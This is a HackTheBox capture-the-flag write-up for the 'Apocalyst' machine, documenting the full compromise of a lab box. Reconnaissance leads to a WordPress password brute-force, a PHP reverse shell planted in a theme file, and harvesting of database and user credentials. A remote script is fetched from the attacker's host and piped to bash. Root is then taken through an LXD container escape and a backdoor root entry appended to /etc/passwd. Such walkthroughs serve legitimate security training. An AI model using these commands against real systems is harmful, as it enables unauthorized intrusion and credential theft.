---
title: "Apocalyst"
date: 2021-07-23 17:10:00 +0530
categories: [HackTheBox, Linux Machines]
tags: [linux, wordpress, ctf, john, passwd, lxd, hackthebox]
image: /assets/img/Posts/Apocalyst/Apocalyst.png
---

# Enumeration
## Masscan + Nmap
```bash
$ masscan -p1-65535,U:1-65535 `IP` --rate=10000 -e tun0 | tee masscan.out
Discovered open port 80/tcp on 10.10.10.46                                     
Discovered open port 22/tcp on 10.10.10.46                                     
```
Parse those ports to nmap:
```bash
$ ports=$(cat masscan.out |awk '{ print $4 }' | sed 's/\/tcp//;s/\/udp//' | tr '\n' ',' | sed 's/,$//')
$ nmap -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out

# Nmap 7.91 scan initiated Fri Jul 23 02:48:51 2021 as: nmap -sVC --min-rate 1000 -p 80,22 -oN nmap-fullscan.out 10.10.10.46
Nmap scan report for 10.10.10.46
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 (RSA)
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc (ECDSA)
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apocalypse Preparation Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 23 02:49:04 2021 -- 1 IP address (1 host up) scanned in 12.97 seconds
```
## HTTP
Directory brute-forcing:
```bash
$ ffuf -u http://`IP`/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .txt,.zip,.html,.php,.bak -fc 401,403,405 | grep -v 'Words: 20'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.46/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Extensions       : .txt .zip .html .php .bak
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 401,403,405
________________________________________________

index.bak               [Status: 200, Size: 148, Words: 36, Lines: 9]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
wp-login.php            [Status: 200, Size: 2460, Words: 153, Lines: 70]
.                       [Status: 301, Size: 0, Words: 1, Lines: 1]
readme.html             [Status: 200, Size: 7413, Words: 760, Lines: 99]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5]
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-cron.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-blog-header.php      [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-links-opml.php       [Status: 200, Size: 235, Words: 14, Lines: 11]
wp-load.php             [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1]
wp-activate.php         [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [378522/378522] :: Job [1/1] :: 430 req/sec :: Duration: [0:14:47] :: Errors: 0 ::
```
It also showed a lot of endpoints which linked to same pic.

I see wordpress so I ran wpscan:
```bash
$ wpscan --url http://`IP` -e ap,t,tt,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[+] URL: http://10.10.10.46/ [10.10.10.46] default: [N]
[+] Started: Fri Jul 23 02:51:17 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.46/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.10.46/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.46/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.46/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.46/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.46/, Match: 'WordPress 4.8'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:09 <================================================> (400 / 400) 100.00% Time: 00:00:09
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://10.10.10.46/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://10.10.10.46/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.10.46/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:58 <==============================================> (2568 / 2568) 100.00% Time: 00:00:58

[i] No Timthumbs Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] falaraki
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul 23 02:52:38 2021
[+] Requests Done: 3032
[+] Cached Requests: 10
[+] Data Sent: 829.915 KB
[+] Data Received: 920.947 KB
[+] Memory used: 230.48 MB
[+] Elapsed time: 00:01:20
```
Got one username: `falaraki`.

I made a wordlist with `cewl` for the / directory as it had some content. Fired it to wp-login.php with wpscan, but it didn't work.

```bash
$ cewl --with-numbers http://apocalyst.htb  > cewl-wordlist
$ wpscan --url http://`IP` -U falaraki -P ./cewl-wordlist --password-attack wp-login
```

# Foothold
Ran ffuf with that new-wordlist:
```bash
$ ffuf -u http://apocalyst.htb/FUZZ/ -w ./cewl-wordlist -fw 14 -s
Rightiousness
```
That contains a word `needle`.
Visiting /needle doesn't lead anywhere.

I downloaded the image, ran exiftool on it:
```bash
$ wget http://10.10.10.46/Rightiousness/image.jpg
$ exiftool image.jpg
ExifTool Version Number         : 12.12
File Name                       : image.jpg
Directory                       : .
File Size                       : 210 KiB
File Modification Date/Time     : 2017:07:27 15:38:34+05:30
File Access Date/Time           : 2021:07:23 16:11:41+05:30
File Inode Change Date/Time     : 2021:07:23 16:11:41+05:30
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x1080
Megapixels                      : 2.1
```
`strings` even didn't lead anywhere.
Ran `steghide` with no password:
```bash
$ steghide extract -sf image.jpg
Enter passphrase:
wrote extracted data to "list.txt".
```

Trying `falaraki:needle` for wp-login didn't work.
Let's try with that `list.txt`:
```bash
$ wpscan --url http://`IP` -U falaraki -P ./list.txt --password-attack wp-login

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - falaraki / Transclisiation
Trying falaraki / total Time: 00:00:22 <==============================================                                                                      > (335 / 821) 40.80%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation
```
`falaraki:Transclisiation` it is.

After logging in:
- I go to Themes, twentyseventeen is the one active.
- Go to editor, edit `index.php` put my php-reverse shell. 
- Load http://10.10.10.46/ and got a shell.

```bash
$ rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.46 53356
Linux apocalyst 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:50:56 up 13:35,  0 users,  load average: 0.00, 0.04, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1406): Inappropriate ioctl for device
bash: no job control in this shell
www-data@apocalyst:/$ 
```

Getting content in `wp-config.php`
```bash
www-data@apocalyst:/var/www/html$ cat /var/www/html/apocalyst.htb/wp-config.php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp_myblog');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'Th3SoopaD00paPa5S!');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Dumping MySQL database:
```bash
$ mysql -uroot -D wp_myblog -p -e 'select user_login,user_pass from wp_users;'

user_login      user_pass
falaraki        $P$BnK/Jm451thx39mQg0AFXywQWZ.e6Z.
```

But the hash didn't crack:
With john:
```bash
$ john hash -w:/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:14 100.0% (ETA: 16:43:10) 0g/s 27933p/s 27933c/s 27933C/s mendoan..meganscott
Session aborted
```
or you can try hashcat:
```bash
$ hashcat -m 400 hash ./rockyou.txt
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)
Hash.Target......: $P$BnK/Jm451thx39mQg0AFXywQWZ.e6Z.
Time.Started.....: Fri Jul 23 16:35:07 2021 (35 secs)
Time.Estimated...: Fri Jul 23 16:35:42 2021 (0 secs)
Guess.Base.......: File (./rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#3.........:   413.7 kH/s (6.84ms) @ Accel:256 Loops:256 Thr:64 Vec:1
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 14344391/14344391 (100.00%)
Rejected.........: 0/14344391 (0.00%)
Restore.Point....: 14344391/14344391 (100.00%)
Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:7936-8192
Candidates.#3....: $HEX[303130303637323235] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#3..: Temp: 77c Util: 94% Core:1695MHz Mem:3504MHz Bus:16

Started: Fri Jul 23 16:35:03 2021
Stopped: Fri Jul 23 16:35:44 2021
```

I see, I can already the user flag:
```bash
www-data@apocalyst:/home/falaraki$ ls -la
-rw------- 1 falaraki falaraki  534 Jul 23 12:09 .bash_history
-rw-r--r-- 1 falaraki falaraki  220 Jul 26  2017 .bash_logout
-rw-r--r-- 1 falaraki falaraki 3771 Jul 26  2017 .bashrc
drwx------ 2 falaraki falaraki 4096 Jul 26  2017 .cache
drwxrwxr-x 2 falaraki falaraki 4096 Jul 26  2017 .nano
-rw-r--r-- 1 falaraki falaraki  655 Jul 26  2017 .profile
-rw-rw-r-- 1 falaraki falaraki  109 Jul 26  2017 .secret
-rw-r--r-- 1 falaraki falaraki    0 Jul 26  2017 .sudo_as_admin_successful
-rw-r--r-- 1 root     root     1024 Jul 27  2017 .wp-config.php.swp
-rw-rw-r-- 1 falaraki falaraki   33 Jul 26  2017 user.txt
www-data@apocalyst:/home/falaraki$ cat user.txt
9182d4d0b3f40307d86673193a9cd4e5
```

Also I've some file named .secret, which seems to have some base64 encoded data:
```bash
www-data@apocalyst:/home/falaraki$ cat .secret | base64 -d; echo
Keep forgetting password so this will keep it safe!
Y0uAINtG37TiNgTH!sUzersP4ss
```

```bash
www-data@apocalyst:/home/falaraki$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@apocalyst:/home/falaraki$ su falaraki
Y0uAINtG37TiNgTH!sUzersP4ss

falaraki@apocalyst:~$
```

# Privesc
Running `linpeas` shows me falaraki is in lxd group and `/etc/passwd` is writable:
```bash
falaraki@apocalyst:~$ curl http://10.10.14.9/peas/linpeas.sh | bash

[+] Permissions in init, init.d, systemd, and rc.d
[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ /etc/passwd is writable
[+] Credentials in fstab/mtab? ........... No
0mNoCan I read shadow files? .............
[+] Can I read opasswd file? ............. No
[+] Can I write in network-scripts? ...... No
[+] Can I read root folder? .............. No

[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=1000(falaraki) gid=1000(falaraki) groups=1000(falaraki),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

### Method 1: LXD container on root path
Created alpine lxc image locally and transferred to apocalyst.htb 
```bash
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

Add the image:
```bash
$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 6939398362a8e14b01de3fbaa1d3b28a40c3e1f8bd06346aaadc6c42c6034d8a
$ lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
| alpine | 6939398362a8 | no     | Alpinelinux 3.8 x86_64 (20210723_1125) | x86_64 | 1.92MB | Jul 23, 2021 at 11:27am (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
```

Create the container and add root path:
```bash
$ lxc init alpine privesc -c security.privileged=true
$ lxc list #List containers
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Execute the container:
```bash
$ lxc start privesc
$ lxc exec privesc /bin/sh
~ # whoami
root
```

### Method 2: /etc/passwd editable
We can even do this with user www-data, as it's world-writable:

```bash
www-data@apocalyst:/$ openssl passwd pass
2NBM/9qsNPXFY
www-data@apocalyst:/$ echo "caretaker:2NBM/9qsNPXFY:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
www-data@apocalyst:/$ su caretaker
pass

root@apocalyst:/# cat /root/root.txt
1cb9d00f62d6015e07e58fa02caaf57f
```
